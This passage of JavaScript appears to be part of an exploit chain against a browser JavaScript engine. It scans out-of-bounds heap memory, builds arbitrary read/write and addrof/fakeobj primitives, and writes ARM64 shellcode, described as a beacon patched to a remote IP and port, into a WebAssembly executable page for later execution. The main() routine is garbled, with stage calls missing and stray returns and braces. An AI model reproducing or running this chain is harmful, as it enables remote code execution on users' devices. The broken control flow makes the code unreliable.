  v = v >>> 0;
  return (v & 1) === 1 && v >= 0x08000000 && v < 0x10000000;
}
function mallocish(lo, hi) {
  hi = hi >>> 0; lo = lo >>> 0;
  return hi >= 0x1 && hi < 0x8000 && lo !== 0;   // raw 64-bit userland pointer halves
}

// ---------------- stage 4: word-space marker scan of the OOB window ----------------
// minimal wasm module: type ()->i32, func f = i32.const 42, export "f"
var WASM_BYTES = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127,
  3, 2, 1, 0, 7, 5, 1, 1, 102, 0, 0, 10, 6, 1, 4, 0, 65, 42, 11]);

function stage4(foo) {
  W.foo = foo;
  var MK0 = itof(CFG.MK0_LO, CFG.MK0_HI);
  var MK1 = itof(CFG.MK1_LO, CFG.MK1_HI);
  // wasm module + instance created BEFORE the witness scan: absorbs compilation
  // allocations and any GC they trigger, so the post-smash bump frontier is stable once
  // the scan runs, and the WasmInstanceObject lands inside the scanned window span.
  try {
    var wmod = new WebAssembly.Module(WASM_BYTES);
    W.winst = new WebAssembly.Instance(wmod);
    note('wasm module+instance ok f()=' + W.winst.exports.f() + ' t=' + ts());
  } catch (e) {
    W.winst = null;
    note('wasm module pre-create failed: ' + e);
  }
  // witnesses allocated AFTER the smash => bump-frontier, inside the OOB window
  var w0 = [MK0, 1.1, 1.1, 1.1];
  var w1 = [MK1, 1.1, 1.1, 1.1];
  W.oT1 = { a: 1 };
  W.oT2 = { b: 2 };
  W.oarr = [W.oT1, W.oT2];
  W.rwab = new ArrayBuffer(CFG.AB1_LEN);
  W.rwv = new DataView(W.rwab);
  W.rwab2 = new ArrayBuffer(CFG.AB2_LEN);
  W.rwv2 = new DataView(W.rwab2);
  W.rwv.setUint32(0, 0xCAFED00D, true);
  W.rwv2.setUint32(0, 0xCAFEBABE, true);
  // on-heap typed array (byte_length <= kMaxSizeInHeap=64): its external_pointer field is
  // cage_base + ByteArray::kHeaderSize (ExternalPointerCompensationForOnHeapArray = isolate
  // root) -> reading it from the window yields the cage base needed to address old space.
  W.ohta = new Uint8Array(0x33);
  note('witnesses allocated t=' + ts());

  // foo_arr JSArray header words: idx2 double = (map, props), idx3 = (elements, length)
  var jmap = f2i(W.foo[2]), jarr = f2i(W.foo[3]);
  if (ptrish(jarr.lo)) W.windowBase = ((jarr.lo - 1) >>> 0) + 8;
  note('foo_arr JSArray idx2=' + JSON.stringify(jmap) + ' idx3=' + JSON.stringify(jarr) +
       ' windowBase=0x' + (W.windowBase >>> 0).toString(16));

  var mk0 = -1, mk1 = -1, ab1 = -1, ab2 = -1, fa = -1, p1 = 0, p2 = 0;
  var ohta = -1, ocageLo = 0, ocageHi = 0;
  var cap = Math.min(CFG.SCAN_WORDS, W.foo.length * 2);
  for (var w = 4; w < cap; w++) {
    var v = word(w) >>> 0;
    if ((v === CFG.MK0_LO || v === CFG.MK0_HI) && mk0 === -1) mk0 = w;
    if ((v === CFG.MK1_LO || v === CFG.MK1_HI) && mk1 === -1) mk1 = w;
    if (v === CFG.AB1_LEN && (word(w + 1) >>> 0) === 0 && mallocish(word(w + 2), word(w + 3)) && ab1 === -1) {
      ab1 = w; W.bs1lo = word(w + 2); W.bs1hi = word(w + 3);
    }
    if (v === CFG.AB2_LEN && (word(w + 1) >>> 0) === 0 && mallocish(word(w + 2), word(w + 3)) && ab2 === -1) {
      ab2 = w; W.bs2lo = word(w + 2); W.bs2hi = word(w + 3);
    }
    if (v === 4 && ptrish(word(w - 1)) && ptrish(word(w + 1)) && ptrish(word(w + 2))) {
      var q1 = word(w + 1) >>> 0, q2 = word(w + 2) >>> 0;
      if (q2 > q1 && (q2 - q1) < 0x100 && fa === -1) { fa = w; p1 = q1; p2 = q2; }
    }
    // On-heap JSTypedArray signature (compressed layout): byte_offset@16 (w+4,w+5)=(0,0),
    // byte_length@24 (w+6,w+7)=(0x33,0), length@32 (w+8,w+9)=(0x33,0),
    // external_pointer@40 (w+10,w+11) = cage_base + ByteArray::kHeaderSize(8) - kHeapObjectTag(1)
    //   => lo word 7, hi word = cage_hi (<=0xFFFF); base_pointer@48 (w+12 ptrish).
    if (ohta === -1 && (word(w + 6) >>> 0) === 0x33 && (word(w + 7) >>> 0) === 0 &&
        (word(w + 8) >>> 0) === 0x33 && (word(w + 9) >>> 0) === 0 &&
        (word(w + 4) >>> 0) === 0 && (word(w + 5) >>> 0) === 0) {
      var eLo = word(w + 10) >>> 0, eHi = word(w + 11) >>> 0;
      var bp = word(w + 12) >>> 0;
      if ((eHi > 0 && eHi <= 0xFFFF) && eLo === 7 && ptrish(bp)) {
        ohta = w; ocageLo = 0; ocageHi = eHi;
      }
    }
    if (mk0 !== -1 && ab1 !== -1 && ab2 !== -1 && fa !== -1 && ohta !== -1) break;
  }
  W.mk0 = mk0; W.ab1 = ab1; W.ab2 = ab2; W.fa = fa; W.p1 = p1; W.p2 = p2;
  W.ohtaIdx = ohta; W.cageLo = ocageLo; W.cageHi = ocageHi;
  if (ohta === -1) {
    var line = '';
    var lo = Math.max(4, (ab2 === -1 ? 1030 : ab2 - 4)), hi = Math.min(cap, lo + 0x60);
    for (var w = lo; w < hi; w++) {
      line += (word(w) >>> 0).toString(16).padStart(8, '0') + ((w % 8 === 7) ? '|' : ' ');
      if (w % 16 === 15) { note('d4 w' + (w - 15) + ': ' + line); line = ''; }
    }
    if (line) note('d4 tail: ' + line);
  }
  var ok = (ab1 !== -1) && (ab2 !== -1) && (fa !== -1);
  report('stage4', ok, 'wordscan: mk0@' + mk0 + ' mk1@' + mk1 + ' ab1@' + ab1 +
    ' ab2@' + ab2 + ' oarrFA@' + fa + ' p1=0x' + p1.toString(16) + ' p2=0x' + p2.toString(16) +
    ' ohta@' + ohta + ' cage=0x' + ocageHi.toString(16) + ':' + ocageLo.toString(16) +
    ' bs1=0x' + W.bs1hi.toString(16) + W.bs1lo.toString(16) +
    ' bs2=0x' + W.bs2hi.toString(16) + W.bs2lo.toString(16) + ' t=' + ts());
  return ok;
}

// ---------------- stage RW: backing_store retarget proof (word-space) ----------------
function addCarry(lo, hi, delta) {
  var nlo = (lo + delta) >>> 0;
  var nhi = hi >>> 0;
  if (nlo < (lo >>> 0)) nhi = (nhi + 1) >>> 0;
  return { lo: nlo, hi: nhi };
}

function stageRW() {
  if (W.ab1 === -1 || W.ab2 === -1) { warn2('stageRW', 'missing AB anchors'); return false; }
  // write proof: point rwab backing_store at rwab2.bs + 4
  var t = addCarry(W.bs2lo, W.bs2hi, 4);
  setWord(W.ab1 + 2, t.lo); setWord(W.ab1 + 3, t.hi);
  W.rwv.setUint32(0, CFG.RW_MAGIC, true);
  var okW = (W.rwv2.getUint32(4, true) === CFG.RW_MAGIC);
  // read proof: seed a magic in rwab2 first, then point rwab backing_store at rwab2.bs + 8
  W.rwv2.setUint32(8, CFG.RW_MAGIC2, true);
  var t2 = addCarry(W.bs2lo, W.bs2hi, 8);
  setWord(W.ab1 + 2, t2.lo); setWord(W.ab1 + 3, t2.hi);
  var okR = (W.rwv.getUint32(0, true) === CFG.RW_MAGIC2);
  // restore original backing store
  setWord(W.ab1 + 2, W.bs1lo); setWord(W.ab1 + 3, W.bs1hi);
  report('stageRW', okW && okR, 'arbitrary R/W via backing_store retarget: write=' + okW +
    ' read=' + okR + ' t=' + ts());
  return okW && okR;
}

// ---------------- stage AF: addrof + fakeobj round-trip via oarr slot (word-space) ----------------
function stageAF() {
  if (W.fa === -1) { warn2('stageAF', 'no oarr elements anchor'); return false; }
  var orig2 = word(W.fa + 2) >>> 0;
  setWord(W.fa + 2, W.p1);              // fakeobj: materialize p1 through the p2 slot
  var same = (W.oarr[1] === W.oT1);
  setWord(W.fa + 2, orig2);             // restore
  report('stageAF', same, 'addrof p1=0x' + W.p1.toString(16) + ' p2=0x' + W.p2.toString(16) +
    ' fakeobj roundtrip=' + same + ' t=' + ts());
  return same;
}

// ---------------- stage W: wasm RWX page prep (write+readback, no call on desk engine) ----------------
// WasmInstanceObject is allocated with AllocationType::kOld (wasm-objects.cc:1265), i.e.
// OUTSIDE the young-gen window — but the proven primitives cover it:
//   1. cage base from the on-heap typed array's external_pointer (read in-window),
//   2. addrof(winst) via the oarr slot trick (proven in stageAF),
//   3. raw address = cage_base + compressed; arbitrary R/W via backing_store retarget.
function stageW() {
  if (typeof WebAssembly === 'undefined' || !W.winst) { warn2('stageW', 'no WebAssembly'); return false; }
  if (W.ohtaIdx === -1 || W.ab1 === -1 || W.fa === -1) { warn2('stageW', 'missing ohta/AB/FA anchors'); return false; }
  try { note('wasm export f() = ' + W.winst.exports.f() + ' t=' + ts()); } catch (e) {}

  // addrof(winst): park it in the oarr slot 1 and read the slot through the window
  W.oarr[1] = W.winst;
  var pw = word(W.fa + 2) >>> 0;
  W.oarr[1] = W.oT2;                    // restore slot contents
  // old-space compressed pointers can sit far above the young-gen range; only require the
  // heap-object tag bit (odd). Real validation happens in the field reads below.
  if ((pw & 1) !== 1 || pw < 0x1000) {
    warn2('stageW', 'addrof(winst) not a tagged pointer: 0x' + pw.toString(16)); return false;
  }
  var winstU = (pw - 1) >>> 0;          // untagged compressed address (old space)
  note('winst compressed=0x' + winstU.toString(16) + ' t=' + ts());

  // raw winst address = cage_base + winstU
  var wRaw = addCarry(W.cageLo, W.cageHi, winstU);
  // DEFINITIVE cage-base self-test: the FDA data0 bits are KNOWN (chain=0xfffffffe at +0,
  // value=0x1fffe at +4). Retarget to cage + (elements-1) + 8 and compare.
  var jel = f2i(W.foo[3]).lo >>> 0;      // elements = FDA tagged ptr
  var fdau = ((jel - 1) >>> 0) + 8;      // FDA data start (untagged)
  var fRaw = addCarry(W.cageLo, W.cageHi, fdau);
  setWord(W.ab1 + 2, fRaw.lo); setWord(W.ab1 + 3, fRaw.hi);
  var t0w = W.rwv.getUint32(0, true) >>> 0, t4w = W.rwv.getUint32(4, true) >>> 0;
  var bstr = '';
  for (var bi = 0; bi < 16; bi++) bstr += W.rwv.getUint8(bi).toString(16).padStart(2, '0') + ' ';
  var le0 = W.rwv.getUint32(0, true) >>> 0, le4 = W.rwv.getUint32(4, true) >>> 0;
  note('cage selftest rawFDA bytes[0..15]= ' + bstr +
       ' g32def=(0x' + t0w.toString(16) + ',0x' + t4w.toString(16) + ')' +
       ' g32LE=(0x' + le0.toString(16) + ',0x' + le4.toString(16) + ') t=' + ts());
  if (t0w !== 0x1fffe || t4w !== 0xfffffffe) {
    warn2('stageW', 'cage selftest FAILED — cage base 0x' + W.cageHi.toString(16) +
      '00000000 wrong or window/retarget mismatch');
    setWord(W.ab1 + 2, W.bs1lo); setWord(W.ab1 + 3, W.bs1hi);
    return false;
  }
  // CROSS-CHECK the addrof mechanism on a known young object:
  // oT1 = {a:1} -> props field (+4) must be empty_fixed_array 0x0804222d (RO, constant).
  var pRaw = addCarry(W.cageLo, W.cageHi, (W.p1 - 1) >>> 0);
  setWord(W.ab1 + 2, pRaw.lo); setWord(W.ab1 + 3, pRaw.hi);
  var xprops = W.rwv.getUint32(4, true) >>> 0;
  var xmap = W.rwv.getUint32(0, true) >>> 0;
  note('crosscheck oT1 raw map=0x' + xmap.toString(16) + ' props=0x' + xprops.toString(16) +
       ' (expect props=804222d) t=' + ts());
  if (xprops !== 0x0804222d) {
    warn2('stageW', 'addrof cross-check FAILED (oT1 props=0x' + xprops.toString(16) +
      ') — p1 slot mapping wrong');
    setWord(W.ab1 + 2, W.bs1lo); setWord(W.ab1 + 3, W.bs1hi);
    return false;
  }
  // dump the winst words 0..31 in ONE retarget
  setWord(W.ab1 + 2, wRaw.lo); setWord(W.ab1 + 3, wRaw.hi);
  var line = '';
  for (var o = 0; o < 128; o += 4) {
    line += W.rwv.getUint32(o, true).toString(16).padStart(8, '0') + (((o / 4) % 8 === 7) ? '|' : ' ');
    if ((o / 4) % 16 === 15) { note('winst w' + o + '+: ' + line); line = ''; }
  }
  if (line) note('winst tail: ' + line);
  var isoLo = W.rwv.getUint32(96, true) >>> 0, isoHi = W.rwv.getUint32(100, true) >>> 0;
  var jtLo = W.rwv.getUint32(104, true) >>> 0, jtHi = W.rwv.getUint32(108, true) >>> 0;
  note('isolate_root=0x' + isoHi.toString(16) + ':' + isoLo.toString(16) +
       ' jump_table_start=0x' + jtHi.toString(16) + ':' + jtLo.toString(16) + ' t=' + ts());
  if (isoLo !== 0 || isoHi === 0 || isoHi > 0xFFFF) {
    warn2('stageW', 'isolate_root not 4GB-aligned cage shape: 0x' + isoHi.toString(16) + ':' + isoLo.toString(16));
    return false;
  }
  if (!mallocish(jtLo, jtHi)) {
    warn2('stageW', 'jump_table_start implausible: 0x' + jtHi.toString(16) + ':' + jtLo.toString(16));
    return false;
  }

  // [G3] FINAL KIT: write the 272-B ARM64 root-proof beacon (SHELLCODE_A64 injected at
  // build time, movk-patched to the rig IP/port; desk fallback = DESK_BEACON_A64 prelude
  // carrying the SAME patched bytes) into the RWX jump-table page and read back to verify.
  // NO code call is made on this x64 desk engine (write+readback only); on the device the
  // next wasm export call transfers control into the beacon (RWX-overwrite validity pinned
  // per fact 1135). Beacon layout: ret@256 (0xd65f03c0), marker 'JZXRPR0T'@260, nop pad.
  var sc = (SHELLCODE_A64 && SHELLCODE_A64.length) ? SHELLCODE_A64
         : (typeof DESK_BEACON_A64 !== 'undefined' ? DESK_BEACON_A64 : null);
  if (!sc || sc.length !== 272) {
    warn2('stageW', 'beacon array missing or wrong length: ' + (sc ? sc.length : 'null') + ' (expect 272)');
    return false;
  }
  var mkOk = (sc[256] === 0xC0 && sc[257] === 0x03 && sc[258] === 0x5F && sc[259] === 0xD6);
  for (var m = 0; m < 8; m++) if (sc[260 + m] !== MKT[m]) mkOk = false;
  if (!mkOk) { warn2('stageW', 'beacon identity check FAILED (expect ret@256 + JZXRPR0T@260)'); return false; }
  setWord(W.ab1 + 2, jtLo); setWord(W.ab1 + 3, jtHi);
  var ok = true;
  for (var n = 0; n < 68; n++) {
    var wv = (sc[n * 4] | (sc[n * 4 + 1] << 8) | (sc[n * 4 + 2] << 16) | (sc[n * 4 + 3] << 24)) >>> 0;
    W.rwv.setUint32(n * 4, wv, true);
  }
  var rb = '';
  for (var n = 0; n < 68; n++) {
    var want = (sc[n * 4] | (sc[n * 4 + 1] << 8) | (sc[n * 4 + 2] << 16) | (sc[n * 4 + 3] << 24)) >>> 0;
    var got = W.rwv.getUint32(n * 4, true) >>> 0;
    if (got !== want) ok = false;
    if (n < 8) rb += got.toString(16) + ' ';
  }
  note('jt readback w[0..7]: ' + rb + (ok ? '... ALL 68 WORDS MATCH' : '... MISMATCH'));
  setWord(W.ab1 + 2, W.bs1lo); setWord(W.ab1 + 3, W.bs1hi); // restore backing_store
  report('stageW', ok, 'wasm RWX jump-table BEACON write+readback verified (272 B JZXRPR0T; call skipped on x64 desk engine) t=' + ts());
  return ok;
}

// ---------------- main ----------------
function main() {
  initReceiverBus(); // [G2] cast stage-bus up before the ladder reports (desk: no-op)
  stage0();
  var hole = stage1();
  var keys = stageK();

    warn2('done', 'stage2 did not land (no FDA smash) — honest stop, no further iteration');
    return;
  }

    return;

    return;
  }

  var af = stageAF();
  if (!rw || !af) {
    warn2('done', 'R/W or addrof/fakeobj proof incomplete — honest stop');
    return;
  }
  var w = false;
  try { w = stageW(); } catch (e) { warn2('stageW', 'threw: ' + e); }
  report('done', true, 'stage2 chain: smash+extend+scan+RW+AF=' + (rw && af) +
    ' wasmRWX=' + w + ' t=' + ts());
}

try {
  main();
} catch (e) {
  warn2('done', 'exception: ' + e + ' t=' + ts());
}
